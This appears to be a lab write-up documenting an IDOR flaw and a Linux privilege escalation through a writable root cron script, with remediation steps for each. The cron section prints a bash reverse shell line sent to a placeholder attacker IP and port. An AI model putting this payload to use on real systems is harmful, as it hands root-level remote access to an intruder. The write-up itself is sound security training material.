# Web Application Security & Linux Exploitation

## 🎯 Lab Objective
To identify, exploit, and remediate critical web vulnerabilities found within the OWASP Top 10 framework, followed by local Linux privilege escalation.

## 🛠️ Tools Used
* Burp Suite (Proxy, Repeater, Intruder)
* Gobuster / Dirbuster
* SQLmap (for verification)
* LinPEAS (Linux Privilege Escalation Awesome Script)

## 🔍 Vulnerability Breakdown & PoC

### 1. Insecure Direct Object Reference (IDOR)
* **Discovery:** While analyzing the user account portal, the URL structure was observed using sequential numeric identifiers.
* **Exploitation:** By sending the request to **Burp Suite Repeater** and modifying the `id` parameter, the server returned the private profile data of a different user without authentication validation.
* **Remediation:** Implement strict, server-side Access Control Checks using cryptographically secure, non-sequential UUIDs.

### 2. Linux Local Privilege Escalation (Cron Job Abuse)
* **Enumeration:** Running `cat /etc/crontab` revealed a custom cleanup script running as `root` every 5 minutes.
* **Exploitation:** The file permissions on `cleanup.sh` were misconfigured, allowing write access to low-privilege users. A bash reverse shell payload was appended to the script:
  ```bash
    # Conceptual payload appended to the vulnerable cleanup.sh
    /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
    ```
* **Remediation:** Restricted the file permissions to the `root` owner only and audited the crontab configuration to ensure adherence to the Principle of Least Privilege:
    ```bash
    sudo chown root:root /usr/local/bin/cleanup.sh
    sudo chmod 755 /usr/local/bin/cleanup.sh
    ```

"Impact: Successful exploitation of these vulnerabilities allowed an unauthenticated external attacker to transition from zero access to full root-level administrative control over the hosting server."
